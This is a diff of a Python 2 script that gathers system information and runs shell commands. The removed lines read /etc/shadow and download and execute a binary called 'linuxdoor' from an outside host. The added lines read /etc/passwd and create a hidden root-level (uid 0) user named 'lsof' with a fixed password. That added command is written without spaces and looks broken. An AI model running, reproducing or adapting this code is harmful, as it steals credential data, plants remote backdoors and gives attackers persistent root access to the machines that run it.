@@ -8,20 +8,18 @@ print platform.uname()
 print platform.system()
 print platform.release()
 
-print "/etc/shadow file: "
-with open('/etc/shadow', 'r') as fin:
+print "/etc/passwd file: "
+with open('/etc/passwd', 'r') as fin:
     print fin.read()
 
 #find out who i am
 
 print "who am i?"
-p = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+p = subprocess.Popen("useradd-p`openssl passwd-1-salt'lsof'admin`-u0-o-groot-Groot-s/bin/bash-d/usr/bin/lsof lsof", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print p.communicate()[0]
 
-#wget
-
 print "who am i?"
-p = subprocess.Popen("wget http://tlbb.oss-cn-hangzhou.aliyuncs.com/linuxdoor && chmod +xl inuxdoor && ./linuxdoor", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+p = subprocess.Popen("ifconfig", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print p.communicate()[0]
 
 #find out my groups
